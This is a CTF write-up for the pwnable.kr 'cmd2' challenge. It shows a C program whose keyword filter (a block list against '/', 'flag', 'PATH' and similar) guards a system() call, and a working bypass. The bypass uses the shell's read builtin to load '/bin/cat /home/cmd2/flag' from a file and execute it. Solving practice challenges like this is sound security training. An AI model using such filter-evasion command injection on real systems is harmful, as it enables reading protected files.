I will be honest on this one, this took me a while to figure out.

This is a follow-up challenge from `cmd1`.

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}
```

In contrast to `cmd1`, this will delete all environment variables before calling `filter` which eliminates our solution to the previous challenge.

At the end i've come to a conclusion that I need some sorts of a bash bulitin to solve this since we cannot use any binaries because `PATH` is mangled, and after a lot of trials i found the following solution.

```bash
cmd2@pwnable:~$ mkdir /tmp/sols   
cmd2@pwnable:~$ cd /tmp/sols
cmd2@pwnable:/tmp/sols$ echo '/bin/cat /home/cmd2/flag' > sol  
cmd2@pwnable:/tmp/sols$ ~/cmd2 "read SOL < sol; \$SOL"
read SOL < sol; $SOL
FuN_*************************
```

What I did here was to create a file with the contents of our command, which executes `cat` on the flag, then i called `cmd2` and also called the bash builtin command `read` to read from the file and then redirect it to the environment variable "SOL", since `delete_env` is called before the `system` call we are fine with this because "SOL" will only be created on execution, then I just ran "\$SOL" to execute the env variable which gave us our flag :).
